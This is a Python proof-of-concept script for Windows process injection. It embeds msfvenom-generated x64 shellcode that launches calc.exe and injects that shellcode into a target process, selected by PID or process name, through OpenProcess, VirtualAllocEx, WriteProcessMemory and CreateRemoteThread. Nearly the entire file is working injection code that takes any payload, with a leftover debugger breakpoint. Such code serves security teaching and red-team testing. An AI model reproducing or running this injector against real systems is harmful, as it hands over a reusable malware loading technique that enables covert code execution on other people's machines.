# code injection PoC using ctypes and 64bit processes and calc.exe shellcode
import sys
import logging
import argparse
import re
from subprocess import check_output
from ctypes import *
from ctypes.wintypes import HANDLE, LPCVOID, LPVOID, DWORD
SIZE_T = c_size_t   # redefine c_size_t to keep the windows API style 

logging.basicConfig(level=logging.INFO)

# define windows symbols with their respective value
# these can be looked up from the microsoft documentation
PAGE_EXECUTE_READWRITE = 0x00000040

# some values are a combination of multiple symbols 
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

# shellcode generated with msfvenom
# msfvenom -p windows/x64/exec CMD=calc.exe -f python 
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x21\x85\x93\x4d\x1e\xea\x0e"
buf += b"\xa9\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\xdd\xcd\x10\xa9\xee\x02\xce\xa9\x21\x85\xd2\x1c\x5f"
buf += b"\xba\x5c\xf8\x77\xcd\xa2\x9f\x7b\xa2\x85\xfb\x41\xcd"
buf += b"\x18\x1f\x06\xa2\x85\xfb\x01\xcd\x18\x3f\x4e\xa2\x01"
buf += b"\x1e\x6b\xcf\xde\x7c\xd7\xa2\x3f\x69\x8d\xb9\xf2\x31"
buf += b"\x1c\xc6\x2e\xe8\xe0\x4c\x9e\x0c\x1f\x2b\xec\x44\x73"
buf += b"\xc4\xc2\x05\x95\xb8\x2e\x22\x63\xb9\xdb\x4c\xce\x61"
buf += b"\x8e\x21\x21\x85\x93\x05\x9b\x2a\x7a\xce\x69\x84\x43"
buf += b"\x1d\x95\xa2\x16\xed\xaa\xc5\xb3\x04\x1f\x3a\xed\xff"
buf += b"\x69\x7a\x5a\x0c\x95\xde\x86\xe1\x20\x53\xde\x7c\xd7"
buf += b"\xa2\x3f\x69\x8d\xc4\x52\x84\x13\xab\x0f\x68\x19\x65"
buf += b"\xe6\xbc\x52\xe9\x42\x8d\x29\xc0\xaa\x9c\x6b\x32\x56"
buf += b"\xed\xaa\xc5\xb7\x04\x1f\x3a\x68\xe8\xaa\x89\xdb\x09"
buf += b"\x95\xaa\x12\xe0\x20\x55\xd2\xc6\x1a\x62\x46\xa8\xf1"
buf += b"\xc4\xcb\x0c\x46\xb4\x57\xf3\x60\xdd\xd2\x14\x5f\xb0"
buf += b"\x46\x2a\xcd\xa5\xd2\x1f\xe1\x0a\x56\xe8\x78\xdf\xdb"
buf += b"\xc6\x0c\x03\x59\x56\xde\x7a\xce\x05\xa4\xeb\x0e\xa9"
buf += b"\x21\x85\x93\x4d\x1e\xa2\x83\x24\x20\x84\x93\x4d\x5f"
buf += b"\x50\x3f\x22\x4e\x02\x6c\x98\xa5\x0a\x13\x83\x2b\xc4"
buf += b"\x29\xeb\x8b\x57\x93\x56\xf4\xcd\x10\x89\x36\xd6\x08"
buf += b"\xd5\x2b\x05\x68\xad\x6b\xef\xb5\xee\x32\xf7\xfc\x27"
buf += b"\x1e\xb3\x4f\x20\xfb\x7a\x46\x2e\x7f\x86\x6d\x87\x44"
buf += b"\xfd\xf6\x4d\x1e\xea\x0e\xa9"

#######################################################
# 
#   ~~~~~~~~~~~~~~ code injection ~~~~~~~~~~~~~~~
#
#######################################################
def injectCode(pid, shellcode):

    # obtain a handle to the process that gets injected into
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    logging.info(f"The value of the process handle h_process: {hex(h_process)}")
    if not h_process:
        logging.error(f"Couldn't acquire handle for PID: {pid} ")
        sys.exit(1)

    # allocate memory
    # return type of ctypes function has to be redefined, so it returns 64 bit values
    kernel32.VirtualAllocEx.restype=c_void_p  # c_ulonglong
    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

    # print address of the newly allocated page
    logging.info(f"The start value of the newly allocated page arg_address: {hex(arg_address)}")
    import pdb
    pdb.set_trace()
    # the argument types also have to be redefied, so that they can deal with the 64bit value arg_address 
    kernel32.WriteProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p, c_size_t, c_size_t]
    kernel32.CreateRemoteThread.argtypes = [c_void_p, c_void_p, c_size_t, c_void_p, c_void_p, c_size_t, c_void_p]

    # write the shellcode to the new allocated memory
    written = 0
    kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), written)

    # call CreateRemoteThread with the entry point set to the start of the written shellcode
    thread_id = c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
        logging.error("CreateRemoteThread failed.")
        sys.exit(1)
    logging.info(f"Code injection successfull - thread ID: {hex(thread_id.value)}")



#############################################################
#
#           Here come supporting functions 
#           not related to injection
#           
#
# add args parser to get processs name or pid of target process
def parseArgs():
    parser = argparse.ArgumentParser(description='Basic WinAPI shellcode injection with python')
    parser.add_argument('-p','--pid', metavar='PID', type=int, dest='pid',
                        help='pid of the process to inject into')
    parser.add_argument('-n','--name', metavar='PROCESS', dest='name', type=str,
                        help='name of the process to inject into')
    args = parser.parse_args()
    # print help if called when no args 
    if not(args.name or args.pid):
        parser.print_help(sys.stderr)
        logging.error("no PID or process name specified")
        sys.exit(1)
    return args

def getPids(args):
    if args.name:
        out = check_output(["tasklist"])
    # split into two processing steps for readability 
    #
    # 1st list comp splits lines of tasklist
    # 2nd trims whitespace characters if there are multiple and returns second column line
    #       2nd column corresponds to PID in tasklist output
    taskinfos = [task for task in str(out).split("\\n") if args.name in task]
    pids = [re.sub("\s+" , " ", task).split()[1] for task in taskinfos]
    if not pids:
        logging.error(f"No PID found for process {args.name}. Is the process running?")
        sys.exit(1)
    logging.info(f"Found the following pids for {args.name}: {pids}. Continuing with PID {pids[0]}")
    return pids[0]
    


if __name__=="__main__":
    kernel32 = windll.kernel32
    args = parseArgs()
    if args.pid:
        pid = args.pid
    else:
        pid = getPids(args)
    injectCode(pid, buf)
    
